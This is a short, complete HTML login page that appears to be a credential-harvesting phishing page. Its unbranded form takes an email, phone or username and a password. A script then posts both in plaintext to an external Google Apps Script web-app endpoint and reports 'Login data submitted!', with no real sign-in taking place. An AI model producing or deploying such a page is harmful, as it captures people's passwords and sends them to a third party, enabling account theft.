<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    body {
      font-family: Arial;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #f2f2f2;
    }
    .login-container {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input {
      display: block;
      width: 100%;
      padding: 10px;
      margin: 10px 0;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Login</h2>
    <input type="text" id="email" placeholder="Email / Phone / Username" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="submitLogin()">Login</button>
  </div>

  <script>
  function submitLogin() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    fetch("https://script.google.com/macros/s/AKfycbzfWwkEfWzdJWQ6kwBevUOIri45358xNKzwAGfUJCMIevUvdksPR9fEQba802n0drH7/exec", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ email, password })
    })
    .then(res => res.json())
    .then(data => {
      alert("Login data submitted!");
    })
    .catch(err => {
      alert("Error submitting login data.");
      console.error(err);
    });
  }
</script>
</body>
</html>
